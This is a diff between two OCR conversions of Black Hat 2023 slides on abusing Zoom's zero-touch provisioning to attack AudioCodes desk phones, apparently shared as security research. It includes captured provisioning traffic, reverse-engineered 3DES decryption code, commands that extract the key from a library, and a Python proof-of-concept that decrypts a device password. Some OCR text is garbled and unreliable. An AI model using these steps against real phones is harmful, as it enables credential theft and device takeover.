@@ -8,18 +8,25 @@ year: 2023
 source_pdf: "Black Hat USA 2023 slides/Moritz Abrell_Zero-Touch-Pwn Abusing Zoom's Zero Touch Provisioning for Remote Attacks on Desk Phones.pdf"
 pages: 148
 sha256: "2bf1ee277468c9d8b6a8de131e46b4645454abcc2cd9e07893ada9359d83acb3"
-text_chars: 53527
-ocr_pages: 115
+text_chars: 41706
+ocr_pages: 98
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 86.6
+ocr_unreliable_blocks: 0
+vision_verified_blocks: 3
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:21:26Z"
+converted_at: "2026-08-12T04:16:58Z"
 ---
 # Zero-Touch-Pwn Abusing Zoom's Zero Touch Provisioning for Remote Attacks on Desk Phones
 
 **Speakers:** Moritz Abrell  
 **Conference:** Black Hat USA 2023  
 **Source:** `Black Hat USA 2023 slides/Moritz Abrell_Zero-Touch-Pwn Abusing Zoom's Zero Touch Provisioning for Remote Attacks on Desk Phones.pdf` (148 pages)
+
 
 ## Slide 1
 
@@ -36,18 +43,6 @@ Moritz Abrell, SySS GmbH
 ## About this Talk
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-2)
-black hat
-USA 2&0e253
-About this Talk
-=0/ root) - aw
-B)
-oy
-```
 
 ## Slide 3
 
@@ -85,22 +80,6 @@ Configuration Server
 Phone
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 2&0e253
-On-Premise (traditional)
-+,
-Ww
-malicious aaa sensitive
-a "~~
-1008 ---O
-=,
-(a
-Phone Configuration Server
-```
 
 ## Slide 6
 
@@ -174,7 +153,8 @@ Source: https://support.zoom.us/hc/en-us/articles/360033223411-Getting-started-w
 
 Source: https://support.zoom.us/hc/en-us/articles/360001299063-Zoom-Phone-Supported-Devices #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Zoom Phone Certified Hardware
@@ -216,10 +196,10 @@ Source: https://supportzoom.us/hc/en-us/articles/360001299063-Zoom-Phone-Support
 
 Source: https://blog.zoom.us/millions-of-reasons-to-celebrate-zoom-phone/
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
 black hat
 USA 2023
 5 Reasons Zoom Phone Has Sold 4
@@ -248,12 +228,10 @@ Source: https://support.zoom.us/hc/en-us/sections/4413424119565-Provisioning-Des
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 2&0e253
 @ Provisioning DeskPhone: x | + v -
 Zoom Support Products — Solutions Resources Plans & Pricing Joiny Hosty Signin
 Product Support» Supportby Topic~ MoreSupport~ Contact Support Q Search
@@ -274,12 +252,10 @@ Source: https://support.zoom.us/hc/en-us/sections/4413424119565-Provisioning-Des
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
-Q
 co
 IT administrator
 ZOOM ne and assigns
@@ -290,17 +266,15 @@ a configuration template
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 vendor redirect service
 A
 2. initiates that Zoom is
 the provisioning and configuration
 server for the added device
-Q
 co
 IT administrator
 ZOOM ne and assigns
@@ -311,17 +285,15 @@ a configuration template
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 vendor redirect service
 A
 2. initiates that Zoom is
 desk phone the provisioning and configuration
 server for the added device
-| |
 Q,
 IT administrator
 ZOOM ne and assigns
@@ -332,17 +304,15 @@ a configuration template
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 vendor redirect service
 A
 2. initiates that Zoom is
 the provisioning and configuration
 server for the added device
-| |
 Q,
 IT administrator
 ZOOM ne and assigns
@@ -354,41 +324,36 @@ desk phone
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 vendor redirect service
 A
 2. initiates that Zoom is
 the provisioning and configuration
 server for the added device
 desk phone
-Q
 co
 IT administrator
 ZOOM ne and assigns
 a configuration template
-e)
 ```
 
 ## Slide 21
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 vendor redirect service
 A
 2. initiates that Zoom is
 the provisioning and configuration
 server for the added device
 desk phone
-Q
 co
 IT administrator
 ZOOM ne and assigns
@@ -399,18 +364,16 @@ a configuration template
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 vendor redirect service
 A
 2. initiates that Zoom is
 the provisioning and configuration
 server for the added device
 desk phone
-Q
 co
 IT administrator
 ZOOM ne and assigns
@@ -423,22 +386,17 @@ a configuration template
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 Vendor Redirect Service
 Request
 Raw Hex
-1 GET /@@9R8F9D8992 HTITP/1.1
-2 Host: redirect. audiocodes.com
 Accept: */*
 User-Agent: AUDC/3.4.6.604 AUDC-IPPhone-C45@HD_UC_3.4.6.
 Conmection: close
-fs
 LA
-6b4/1
 ```
 
 ## Slide 24
@@ -447,26 +405,21 @@ LA
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 Vendor Redirect Service
 Request
 Raw
 Hex
 1 GET |/@@988F9D8992
 2 Host:
-fs
 LA
-Connection:
 close
 HTTP/1.1
-redirect. audiocodes.com
 Accept: */*
 User-Agent: AUDC/3.4.6.604 AUDC-IPPhone-C45@HD_UC_3.4.6.
-6b4/1
 ```
 
 ## Slide 25
@@ -475,12 +428,10 @@ User-Agent: AUDC/3.4.6.604 AUDC-IPPhone-C45@HD_UC_3.4.6.
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 2&0e253
 Vendor Redirect Service
 Request
 Raw Hex
@@ -489,7 +440,6 @@ Raw Hex
 Accept: */*
 User-Agent: AUDC/3.4.6.604 AUDC-IPPhone-C45@HD_UC_3.4.6.6@4/1
 Conmection: close
-fs
 LA
 ```
 
@@ -499,12 +449,10 @@ LA
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 2&0e253
 Vendor Redirect Service
 Response
 Raw Hex Render
@@ -513,11 +461,6 @@ Content-Length: ®
 Connection: close
 Content-Type: text/plain; charset=utf-&8
 Date: Thu, 29 Jun 2@23 @8:20:05 GMT
-6 Location: https: //eu@lpbxacp.zoom.us/api/v2/pbx/provisioning/audiocodes/
-7 Request-Context: appId=cid-v1:229bb6bd-04d7-408d-b225-c6e440T5c51b
-Lu PF
-fs
-LA
 ```
 
 ## Slide 27
@@ -526,25 +469,17 @@ LA
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 2&0e253
 Vendor Redirect Service
 Response
 Raw Hex Render
-HTTP/ 1.1} 302 Found
 Content-Length: ®
 Connection: close
 Content-Type: text/plain; charset=utf-&8
 Date: Thu, 29 Jun 2@23 @8:20:05 GMT
-6 Location: https: //eu@lpbxacp.zoom.us/api/v2/pbx/provisioning/audiocodes/
-7 Request-Context: appId=cid-v1:229bb6bd-04d7-408d-b225-c6e440T5c51b
-Lu PF
-fs
-LA
 ```
 
 ## Slide 28
@@ -553,46 +488,34 @@ LA
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 2&0e253
 Vendor Redirect Service
 Response
 Raw Hex Render
-HTTP/ 1.1} 302 Found
 Content-Length: ®
 Connection: close
 Content-Type: text/plain; charset=utf-&8
 Date: Thu, 29 Jun 2@23 @8:20:05 GMT
-6/Location: https: //eu@lpbxacp.zoom.us/api/v2/pbx/provisioning/audiocodes/
-Reguest-Context: appId=cid-vi:229bb6bda-@4d?7-408q0-b225-c6e44eT5c51b
-Lu PF
-fs
-LA
 ```
 
 ## Slide 29
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 Request
 Raw Hex
 GET /@@9@8F9D8993 HITP/1.1
 Host: redirect.audiocodes.com
 Accept: */*
-User-Agent: AUDC/3.4.6.604 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
 5 Connection: close
-O@(€|(>
 Lil Pa
-fs
 Response
 Raw Hex Render
 HTTP/1.1 382 Found
@@ -602,29 +525,22 @@ Content-Type: text/plain; charset=utf-8
 5 Date: Thu, 29 Jun 2823 @8:31:18 GMT
 6 Location: https://eu@lpbxacp.zoom.us/api/v2/pbx/provisioning/audiocodes/
 7 Request-Context: appId=cid-v1:229bb6bd-04d7-408d-b225-c6e440f5c51b
-Li Pk
-io
 ```
 
 ## Slide 30
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 Request
 Raw Hex
 1 GET) /@@988F9D8993 HTTP/1.1
 2 Host: redirect.audiocodes.com
 Accept: */*
-User-Agent: AUDC/3.4.6.604 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
 Connection: close
-O@(€|(>
-Fa La
-LA
 Response
 Raw Hex Render
 HTTP/1.1 382 Found
@@ -634,8 +550,6 @@ Content-Type: text/plain; charset=utf-8
 Date: Thu, 29 Jun 2823 08:31:18 GMT
 6 Location: https://eu@lpbxacp.zoom.us/api/v2/pbx/provisioning/audiocodes/
 7 Request-Context: appId=cid-v1:229bb6bd-04d7-408d-b225-c6e440f5c51b
-Li Pk
-io
 LA
 ```
 
@@ -643,11 +557,10 @@ LA
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 Response
 Raw Hex Render
 1 HTTP/1.1 302 Found
@@ -663,15 +576,11 @@ Raw Hex Render
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 Response
-Lu Pt
-fe
-LA
 Date:
 6 Locati
 Raw
@@ -682,7 +591,6 @@ Content-Length: @
 Connection: close
 Content-Type: text/plain: charset=utTf-&
 @8 Nov 2022 16:28:39 GMT
-on:| https://SecureProvService.
 7 Request-Context: appId=cid-v1:229bb6bd-@4d7-408d-b225-c6e44eaT5c51b
 ```
 
@@ -690,11 +598,10 @@ on:| https://SecureProvService.
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 Response
 Raw Hex Render
 HTTP/1.1 302 Found
@@ -703,21 +610,17 @@ Connection: close
 Content-Type: text/plain: charset=utf-&
 5 Date: Fri, 13 Jan 2023 @7:58:082 GMT
 6 Location: https:/ 2] firmware.
-7 Request-Context: appId= cid- v1: 229bb6bd -@4d7 -408d-b225-c6e440T5c51b
 fos
-‘ini
 ```
 
 ## Slide 34
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 2&0e253
 Response
 Raw Hex Render
 HTTP/1.1 288 OK
@@ -731,17 +634,12 @@ Upgrade: h2
 9 Content-Type: text/plain; charset=UTF-8
 1@ Set-Cookie: BIGipServerPORTAL_8@=1010
 Content-Length: 3352
-Wom I
 fs
-Wo oR
-:Genband_AUDC_IP_Phone_4xx_configuration_template_v2
 ;Special interop - Genband
 Voip/services/application_server_type=GENBAND
-fa
 ;Private Line settings
 & voip/line/@/enabled=1
 19 voip/line/@/auth_name=
-20 voip/line/@®/auth_password=
 21 voip/line/@/description=
 22 voip/line/@/id=
 23 voip/line/@/line_mode=PRIVATE
@@ -752,11 +650,10 @@ fa
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 Request
 Raw Hex
 GET /pub/MP202-DMS-Flash-USA.CONF HTTP/1.1
@@ -764,9 +661,6 @@ Host: redirect. audiocodes.com
 User-Agent: AUDC/3.4.6.684 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
 Accept: */*
 > Connection: close
-Lu PF
-fo
-()f> |€|>
 Response
 Raw Hex
 HTTP/1.1 288 OK
@@ -774,19 +668,16 @@ Content-Length: 528
 Connection: close
 Content-Type: application/octet-stream
 5 Date: Wed, 26 Oct 2022 18:59:21 GMT
-on
-fo
 ```
 
 ## Slide 36
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 Request
 Raw Hex
 GET |/pub/MP202-DMS-Flash-USA.CONF) HTTP/1.1
@@ -794,9 +685,6 @@ Host: redirect. audiocodes.com
 User-Agent: AUDC/3.4.6.684 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
 Accept: */*
 > Connection: close
-Lu PF
-fo
-()f> |€|>
 Response
 Raw Hex
 HTTP/1.1 288 OK
@@ -804,30 +692,23 @@ Content-Length: 528
 Connection: close
 Content-Type: application/octet-stream
 5 Date: Wed, 26 Oct 2022 18:59:21 GMT
-on
-fo
 ```
 
 ## Slide 37
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 Request
 Raw Hex
 GET |/pub/MP202-DMS-Flash-USA.CONF) HTTP/1.1
-Host: | redirect. audiocodes.com
 User-Agent: AUDC/3.4.6.684 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
 Accept: */*
 Connection: close
-Lu PF
-fo
 LA
-()f> |€|>
 Response
 Raw Hex
 1 HTTP/1.1 208 OK
@@ -835,7 +716,6 @@ Raw Hex
 3 Connection: close
 Content-Type: application/octet-stream
 Date: Wed, 26 Oct 2022 18:59:21 GMT
-fs i]
 LA
 ```
 
@@ -843,25 +723,19 @@ LA
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 Request
 Raw Hex
 GET |/pub/MP202-DMS-Flash-USA.CONF) HTTP/1.1
-Host: | redirect. audiocodes.com
 User-Agent: AUDC/3.4.6.684 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
 Accept: */*
 Connection: close
-Lu PF
-fo
 LA
-()f> |€|>
 Response
 Raw Hex
-1} HTTP/1.1 208 OK
 2) Content-Length: 528
 3 Connection: close
 4 Content-Type: application/octet-stream
@@ -882,41 +756,30 @@ Raw Hex
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 2&0e253
 Response
 Pretty Raw Hex
 13 X-Content-Type-Options: nosnift
 14 Connection: close
-1s
 16 ems_server/provisioning/url=https: //1ppdm. audiocodes.com/
 1? provisioning/method=STATIC
-18 provisioning/configuration/url=https: //1ppdm. audiocodes.com/dynamiccontfigfiles/
 19 provisioning/firmware/url=https: //1ppdm. audiocodes.com/firmwaretiles/
-20 ems server /user_name=system
 21 ems_server/user_password={
-"VvLZ0p5/5pM="
 i
-See ee eee
 ```
 
 ## Slide 41
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 $ echo "Vv1Z0p5/5pM=" | base64 -d | xxd
-76;
-@Q0000000: 56f9 593a 9e7f e693 =~
-ViVi...
 ```
 
 ## Slide 42
@@ -925,11 +788,10 @@ ViVi...
 
 Source: https://www.audiocodes.com/library/firmware
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 IP Phone Software Image Files
 Click here to download the latest software image files of the AudioCodes IP Phones
 Source: https://www.audiocodes.com/library/firmware
@@ -965,17 +827,11 @@ Source: https://www.audiocodes.com/library/firmware
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 undefined
-O0010T44 70 46
-O0010T48 OG 60
-00010T4c 1 408
-@0010T50 02 56
-a0010T54 89 fe
 2d
 ae
 ae
@@ -987,11 +843,7 @@ el
 el
 eb
 undefined AC_Decrypt_Param{ }
-r:1 <RETURN=
-stmdb sp!,{r4,r5,16,1r
-cpy T6, Fé
 cpy r4,rl
-cpy T5,r2
 bl decrypt_string
 ```
 
@@ -999,10 +851,10 @@ bl decrypt_string
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Oo mo
 18
 11
 12
@@ -1010,7 +862,6 @@ Oo mo
 14
 15
 16
-17
 18
 19
 28
@@ -1018,11 +869,8 @@ Oo mo
 22
 23
 a4
-oe
 26
-a7
 28
-|
 31
 32
 33
@@ -1038,7 +886,6 @@ undefined4 decrypt_string(char *param_1,undefined4 param_2)
 size_t sVarl;
 int iVar2;
 undefined4 uVar3:
-undefined4 *puVar4:
 undefined4 *puVars;
 undefined4 *puVar6;
 undefined auStack_182@ [2044]:
@@ -1047,31 +894,24 @@ char acStack_102@ [2048];
 undefined4 local_82@ [2]:
 undefined local_818 [17]:
 undefined auStack_8@7 [2027]:
-puVard
-puVarS
 do {
 puVar6 = puVar5 + 2;
 uVar3 = puVar5[1i];
 *ouVard = *puVars;
 puVar4[1] = uVar3;
 puVar4 = puVard + 2:
-puVars = puVar6;
 } while (puVar6 != &UNK_00010Td®);
-*puVard = @;
 memset (auStack_807,0,@x7e7):
 sVarl = strlen(param_1);
 if (((sVarl < 5) || (iVar2 = strncmp(param_1,"{\"",2), iVar2 != @)) ||
 (iVar2 = strncmp(param_1 + (sVari - 2),"\"}",2), iVar2 != 8)) {
 uVar3 = OxffffffftT:
-local_828:
-BYTE_ARRAY_@@010Tb8;
 }
 else {
 strncpy(acStack_102@,param_1 + 2,sVarl - 4);
 acStack_102@[sVari - 4] = '\O';
 sVarl = strlen(acStack_1028):
 uVar3 = base64_decode(acStack_1020, sVari, auStack_1820):
-des3_crypt(auStack_1820,param_2,uVar3,local_820,0);
 uVar3 = @:
 }
 return uVar3;
@@ -1082,7 +922,8 @@ return uVar3;
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 77/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 37
@@ -1095,7 +936,6 @@ else {
 strncpy(acStack_1020,param_1 + 2,sVarl - 4);
 acStack_ 1@2@[sVarl - 4] = '\@':
 sVarl = strlen(acStack_1020):
-uVar3 = baseb4_decode(acStack_ 1020, sVarl,auStack_1820):
 des3_crypt(auStack_1820, param_2,uVar3, local_820,6);
 uVars = @:
 r
@@ -1106,20 +946,15 @@ r
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 76/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 48 DES_set_key_unchecked(param_4,&D5tack
 51 DES_ede3_cbc_encrypt(input,param_2,
 _1a8);
 49 DES_set_key_unchecked(param_4[1] ,&2DStack_128);
 58 DES_set_key_unchecked(param_4[2] ,&DSta
-icK_ag):
-_ sire, &05tack_
-8, &0S5tack_
-local_ib®,param_5)
 ```
 
 ## Slide 49
@@ -1128,37 +963,22 @@ Source: https://www.openssl.org/docs/man3.0/man3/DES_ede3_cbc_encrypt.html
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 74/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 os /docs/man3.0/man3/DE
-x Tia
-€ C  @ openssl.org/docs/n
+€ C @ openssl.org/docs/n
 1an3.0/man3/DES
 void DES _ede3_cbc_encrypt(const unsigned ‘input, unsigned
 long length, DE
-S_key_schedule
 DES key schedule 5
-*kc3
 *ivec, 1 enc
-Source: https://www.openssl.org/docs/man3.0/man3/DES_ede3_cbc_encrypt.html
 ```
 
 ## Slide 50
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 20es3
-5@ DES_ede3_cbc_encrypt
-51 (input,output,  size,&DES_key_schedule*ks1,&DES_key_schedule*ks2,&DES_key_schedule*k
-52 ,ivec,enc):
-```
 
 ## Slide 51
 
@@ -1168,35 +988,24 @@ USA 20es3
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 73/100 on the text kept, 54/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 IV
 KEY
-BYTE_ARRAY_GOG1OTbO
-OGOLOTbO db [8]
-G0010TbO [0] A3h, Adh,
 o0010fb4 [4] 35h, CBh,
-OGOLETbE db [24]
 GOO1ETbS [6] 60h, 40h, 75h, FBh,
-eooLETbe [4]
-GooLEfcO [8]
-B0G1ATc4 [12]
-B08LATcB [16]
-BGG1GTcc [20]
 ```
 
 ## Slide 52
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 # Extraction of the Key:
 $ offset=$(python3 -c 'print(int("@@000fb8", base=16))')
 $ dd skip=$offset count=24 if=libac_des3.so of=key.bin bs=1
@@ -1209,7 +1018,8 @@ $ dd skip=$offset count=8 if=libac_des3.so of=iv.bin bs=1
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 #!/usr/bin/env python3
@@ -1218,8 +1028,6 @@ import sys
 import base64
 from Crypto.Cipher import DES3
 from binascii import unhexlify
-KEY = unhexlify(' 604075 Fo###HHHHHHHHHEHHHHHHHEEEREPHEREHEEE EERE | )
-IV unhexlify( ' a3sa4####35cb####' )
 def decrypt(ciphertext):
 ciphertext_decoded base64 .b64decode (ciphertext)
 cipher = DES3.new(KEY, DES3.MODE_CBC, iv-IV)
@@ -1227,19 +1035,16 @@ plaintext cipher.decrypt(ciphertext_decoded)
 print("plain text password: {}".format(plaintext.decode('utf-8')))
 def main():
 decrypt(sys.argv[1])
-if __name__ '"__main__':
-main( )
 ```
 
 ## Slide 54
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 $ python3 poc.py Vv1Z0p5/5pM=
 plain text password: system
 ```
@@ -1248,11 +1053,10 @@ plain text password: system
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 $ python3 poc.py Vv1Z0p5/5pM=
 plain text password: |system
 ```
@@ -1263,23 +1067,15 @@ plain text password: |system
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 Response
-Lil PL
 fs
 LA
-A
-pull
-E
-pull
-JI
 Raw Hex Render
 HTTP/1.1 20@ OK
-Date: Tue, @8 Nov 28022 11:09:13 GMT
 Server: Apache
 X-Frame-Options: SAMEORIGIN
 Referrer-Policy: no-referrer
@@ -1309,11 +1105,10 @@ ems_server/user_password={"nQb iw==" }
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 28.1
 Encrypting Configuration Files
 This procedure describes how to encrypt the Configuration file. For example, you may wish
@@ -1336,11 +1131,10 @@ AudioCodes Administrator Manual
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 28.1 Encrypting Configuration Files
 This procedure describes how to encrypt the Configuration file. For example, you may wish
 to encrypt the configuration file when it is send over an unsecure network.
@@ -1362,11 +1156,10 @@ AudioCodes Administrator Manual
 
